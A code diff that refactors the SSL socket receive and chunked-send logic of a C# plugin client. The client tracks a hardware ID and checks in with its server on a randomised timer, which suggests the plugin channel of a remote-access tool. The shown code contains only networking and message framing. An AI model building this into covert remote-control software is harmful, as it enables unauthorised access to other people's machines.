@@ -19,9 +19,9 @@ namespace Plugin
         public static SslStream SslClient { get; set; }
         public static X509Certificate2 ServerCertificate { get; set; }
         private static byte[] Buffer { get; set; }
-        private static long Buffersize { get; set; }
+        private static long HeaderSize { get; set; }
+        private static long Offset { get; set; }
         private static Timer Tick { get; set; }
-        private static MemoryStream MS { get; set; }
         public static bool IsConnected { get; set; }
         private static object SendSync { get; } = new object();
         public static string Hwid { get; set; }
@@ -44,8 +44,9 @@ namespace Plugin
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                     SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                    Buffer = new byte[4];
-                    MS = new MemoryStream();
+                    HeaderSize = 4;
+                    Buffer = new byte[HeaderSize];
+                    Offset = 0;
                     Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
 
@@ -86,13 +87,12 @@ namespace Plugin
                 Tick?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
-                MS?.Dispose();
                 GC.Collect();
             }
             catch { }
         }
 
-        public static void ReadServertData(IAsyncResult ar)
+        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
         {
             try
             {
@@ -104,34 +104,40 @@ namespace Plugin
                 int recevied = SslClient.EndRead(ar);
                 if (recevied > 0)
                 {
-                    MS.Write(Buffer, 0, recevied);
-                    if (MS.Length == 4)
+                    Offset += recevied;
+                    HeaderSize -= recevied;
+                    if (HeaderSize == 0)
                     {
-                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
-                        Debug.WriteLine("/// Plugin Buffersize " + Buffersize.ToString() + " Bytes  ///");
-                        MS.Dispose();
-                        MS = new MemoryStream();
-                        if (Buffersize > 0)
+                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
+                        Debug.WriteLine("/// Plugin Buffersize " + HeaderSize.ToString() + " Bytes  ///");
+                        if (HeaderSize > 0)
                         {
-                            Buffer = new byte[Buffersize];
-                            while (MS.Length != Buffersize)
+                            Offset = 0;
+                            Buffer = new byte[HeaderSize];
+                            while (HeaderSize != 0)
                             {
-                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
-                                if (rc == 0)
+                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
+                                if (rc <= 0 || HeaderSize < 0)
                                 {
                                     IsConnected = false;
                                     return;
                                 }
-                                MS.Write(Buffer, 0, rc);
+                                Offset += rc;
+                                HeaderSize -= rc;
                             }
                             Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
-                            thread.Start(MS.ToArray());
-                            Buffer = new byte[4];
-                            MS.Dispose();
-                            MS = new MemoryStream();
+                            thread.Start(Buffer);
+                            Offset = 0;
+                            HeaderSize = 4;
+                            Buffer = new byte[HeaderSize];
                         }
                     }
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                    else if (HeaderSize < 0)
+                    {
+                        IsConnected = false;
+                        return;
+                    }
+                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
                 {
@@ -163,25 +169,22 @@ namespace Plugin
 
                     if (msg.Length > 1000000) //1mb
                     {
-                        int chunkSize = 50 * 1024;
-                        byte[] chunk = new byte[chunkSize];
-                        using (MemoryStream buffereReader = new MemoryStream(msg))
+                        Debug.WriteLine("send chunks");
+                        using (MemoryStream memoryStream = new MemoryStream(msg))
                         {
-                            BinaryReader binaryReader = new BinaryReader(buffereReader);
-                            int bytesToRead = (int)buffereReader.Length;
-                            do
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                             {
-                                chunk = binaryReader.ReadBytes(chunkSize);
-                                bytesToRead -= chunkSize;
-                                SslClient.Write(chunk, 0, chunk.Length);
-                                SslClient.Flush();
-                            } while (bytesToRead > 0);
-
-                            binaryReader.Dispose();
+                                TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                SslClient.Write(chunk, 0, read);
+                            }
                         }
                     }
                     else
                     {
+                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                         SslClient.Write(msg, 0, msg.Length);
                         SslClient.Flush();
                     }
